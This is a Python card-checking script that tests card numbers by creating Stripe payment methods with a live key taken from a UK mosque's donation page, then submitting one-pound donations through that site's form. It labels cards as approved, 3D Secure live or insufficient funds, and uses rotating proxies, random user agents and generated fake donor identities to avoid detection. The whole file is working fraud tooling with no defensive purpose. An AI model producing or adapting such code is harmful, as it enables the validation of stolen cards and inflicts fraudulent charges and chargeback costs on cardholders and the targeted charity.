import requests
import random
import json
from config import *
from utils import load_config, generate_identifier

def payment(card, cc_no, month, year, cvv):
    config = load_config()
    user_agent = random.choice(USER_AGENTS)
    
    # Check expiration
    if (len(year) == 2 and int(year) < 24) or (len(year) != 2 and int(year) < 2024):
        return [False, "Expired Card"]
    
    data = {
        'type': 'card',
        'card': {
            'number': cc_no,
            'cvc': cvv,
            'exp_month': month,
            'exp_year': year
        },
        'guid': generate_identifier('guid'),
        'muid': generate_identifier('muid'),
        'sid': generate_identifier('sid'),
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/d182db0e09; stripe-js-v3/d182db0e09; card-element',
        'referrer': 'https://masjidmadrassafaizulquran.co.uk',
        'time_on_page': 200441,
        'key': 'pk_live_51OfjhRJwKVEuci98tEMm7WUNDSX0HSQrQ6p2arFSBdc08L76O7sCYfb1K01V94OjQwVz5EIT1Ufg79uaVVn5Ljta00Xp8wxYrF'
    }
    
    proxies = None
    if config.get('proxy_host'):
        if config.get('proxy_username'):
            proxy_url = f"http://{config['proxy_username']}:{config['proxy_password']}@{config['proxy_host']}:{config['proxy_port']}"
        else:
            proxy_url = f"http://{config['proxy_host']}:{config['proxy_port']}"
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
    
    try:
        response = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            data=data,
            headers={'User-Agent': user_agent},
            proxies=proxies,
            timeout=30
        )
        
        response_data = response.json()
        if 'id' in response_data:
            return [True, response_data['id']]
        else:
            return [False, "Invalid Payment Method"]
            
    except Exception as e:
        return [False, f"Request Error: {str(e)}"]

def donate(card, payment_id, name, email):
    config = load_config()
    user_agent = random.choice(USER_AGENTS)
    
    form_data = f"data=__fluent_form_embded_post_id%3D572%26_fluentform_3_fluentformnonce%3Dbcd36fbd50%26_wp_http_referer%3D%252Fdonate%252F%26names%255Bfirst_name%255D%3D{name}%26names%255Blast_name%255D%3D{name}%26email%3D{email}%26payment_input%3DOther%26custom-payment-amount%3D1%26payment_method%3Dstripe%26__stripe_payment_method_id%3D{payment_id}&action=fluentform_submit&form_id=3"
    
    proxies = None
    if config.get('proxy_host'):
        if config.get('proxy_username'):
            proxy_url = f"http://{config['proxy_username']}:{config['proxy_password']}@{config['proxy_host']}:{config['proxy_port']}"
        else:
            proxy_url = f"http://{config['proxy_host']}:{config['proxy_port']}"
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
    
    try:
        response = requests.post(
            'https://masjidmadrassafaizulquran.co.uk/wp-admin/admin-ajax.php',
            data=form_data,
            headers={
                'Referer': 'https://masjidmadrassafaizulquran.co.uk/donate/',
                'User-Agent': user_agent,
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            proxies=proxies,
            timeout=30
        )
        
        response_data = response.json()
        
        if 'errors' in response_data:
            if 'insufficient funds' in response_data['errors']:
                return [True, "insufficient", "Insufficient Funds"]
            else:
                return [False, response_data['errors']]
        elif response_data.get('success'):
            message = response_data.get('data', {}).get('message', '')
            if 'Verifying strong customer authentication' in message:
                return [True, "live", "CVV LIVE (3D Secure)"]
            else:
                return [True, "live", "Card Approved"]
                
        return [False, "Unknown error"]
        
    except Exception as e:
        return [False, f"Proxy Error: {str(e)}"]

def random_user_info():
    try:
        response = requests.get('https://randomuser.me/api/?nat=us', timeout=10)
        data = response.json()
        
        if data and 'results' in data and data['results']:
            result = data['results'][0]
            first_name = result['name']['first']
            email = result['email']
            
            email_domains = ["@gmail.com", "@outlook.com", "@hotmail.com"]
            random_domain = random.choice(email_domains)
            modified_email = email.split('@')[0] + random_domain
            
            return [True, first_name, modified_email]
            
    except Exception as e:
        print(f"Random user error: {e}")
    
    return [False, "Random Generation Failed"]
